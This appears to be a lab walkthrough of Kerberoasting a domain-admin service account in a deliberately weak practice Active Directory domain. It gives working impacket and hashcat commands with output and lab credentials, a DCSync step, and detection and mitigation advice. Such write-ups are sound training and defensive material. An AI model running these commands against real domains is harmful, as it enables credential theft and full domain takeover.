# Walkthrough — Kerberoasting `SQL_Service`

**Target:** `MARVEL.local` (HYDRA-DC, 10.0.2.10) · **Attacker:** Kali on the tailnet
**Maps to:** [vulnerabilities.md → V1](../vulnerabilities.md#v1--kerberoastable-service-account-rc4-forced-over-privileged-creds-in-description)
**MITRE ATT&CK:** T1558.003 — Steal or Forge Kerberos Tickets: *Kerberoasting*

> Everything here uses the lab's public, deliberately-weak credentials. Do not run this against
> anything you don't own. Raw loot stays in a local git-ignored dir, never in this repo.

---

## 1. The idea

Any account with a **Service Principal Name (SPN)** can have a Kerberos service ticket (TGS-REP)
requested for it by **any authenticated domain user**. That ticket is encrypted with a key derived
from the **service account's password**. So a low-privileged user can pull the ticket and crack it
**offline** — no lockout, no noise against the account, no admin rights needed.

In this lab the SPN sits on **`SQL_Service`**, which is also a **Domain Admin** — so cracking it is
game over.

## 2. Enumerate SPN accounts (any valid creds)

`fcastle` / `Password1` is an ordinary domain user — that's all it takes:

```bash
impacket-GetUserSPNs 'MARVEL.local/fcastle:Password1' -dc-ip 10.0.2.10
```

```text
ServicePrincipalName                     Name         MemberOf
---------------------------------------  -----------  ----------------------------------------
HYDRA-DC/SQL_Service.MARVEL.local:60111  SQL_Service  CN=Group Policy Creator Owners,...,DC=local
```

The `MemberOf` already screams the problem: **a service account in a privileged group.** (In this
lab it's in the full Domain/Enterprise/Schema Admins + GPCO set — see V1.)

## 3. Request the roast (TGS-REP hash)

Add `-request` to actually pull the crackable ticket:

```bash
impacket-GetUserSPNs 'MARVEL.local/fcastle:Password1' -dc-ip 10.0.2.10 -request \
  | tee ~/marvel-loot/krb.txt
```

```text
$krb5tgs$23$*SQL_Service$MARVEL.LOCAL$MARVEL.local/SQL_Service*$81305257e03650fdfd9056c230a99492$ef9f4356...<~2 KB of ciphertext>...1811d8
```

### Why it says `$23$` — and why that's the whole point

The `23` is the Kerberos **encryption type (etype)**: `23` = **RC4-HMAC**. That's what makes this
crackable with a GPU and `rockyou` in seconds.

On **Windows Server 2022** the KDC prefers AES, so by default you'd get an **`$18$` (AES256)**
ticket — much slower to crack — or, if the account is pinned to AES, the request fails with
**`KDC_ERR_ETYPE_NOSUPP`**. This lab forces the account to advertise **RC4 only** via
`msDS-SupportedEncryptionTypes = 4`, baked in by the `domain_controller` role (see
[group_vars/all.yml](../../ansible/group_vars/all.yml) → `supported_enc_types: 4`). That single
attribute is why the roast reliably comes back as `$krb5tgs$23$` every deploy, with no manual
`Set-ADUser` afterwards.

| etype | Meaning | hashcat mode |
|---|---|---|
| **23** | RC4-HMAC (what this lab forces) | `-m 13100` |
| 18 | AES256-CTS-HMAC-SHA1-96 | `-m 19700` |
| 17 | AES128-CTS-HMAC-SHA1-96 | `-m 19600` |

## 4. Crack it offline

```bash
hashcat -m 13100 ~/marvel-loot/krb.txt /usr/share/wordlists/rockyou.txt
```

```text
$krb5tgs$23$*SQL_Service$MARVEL.LOCAL$...:MYpassword123#
Status...........: Cracked
```

Recovered: **`SQL_Service : MYpassword123#`**.

> **Shortcut finding:** you didn't even need to crack it. The same password is sitting in the
> account's **AD `description`** (`"The password is MYpassword123#"`), readable by any
> authenticated user — a second, independent V1 finding.

## 5. Impact — why this is critical here

`SQL_Service` is a **Domain Admin**, so the cracked password is immediate full-domain compromise:

```bash
# Authenticate as the roasted DA and DCSync the whole directory:
impacket-secretsdump MARVEL.local/SQL_Service:'MYpassword123#'@10.0.2.10
```

That leads straight into the [full compromise chain](../vulnerabilities.md#validated-end-to-end--full-compromise-chain-2026-11-25)
(DCSync → NTDS → Pass-the-Hash / Golden Ticket).

## 6. Detection & mitigation (the real-world fixes)

**Detect**
- **Event ID 4769** (Kerberos service ticket requested) with **Ticket Encryption Type `0x17`**
  (RC4) — especially in volume or for accounts that shouldn't be requested. RC4 requests on a
  modern AES domain are a high-signal indicator.
- A sudden burst of 4769s from one principal across many SPNs.

**Mitigate**
- Use **Group Managed Service Accounts (gMSA)** — 120-char, auto-rotated passwords that can't be
  cracked offline — or, failing that, **25+ character random** service-account passwords.
- Keep service accounts **out of Domain Admins**; grant only the specific rights the service needs.
- Enforce **AES-only** Kerberos (`msDS-SupportedEncryptionTypes = 0x18`) and remove RC4 domain-wide;
  roasting AES tickets is impractical.
- **Never** store secrets in `description` / `info` — any authenticated user can read them.
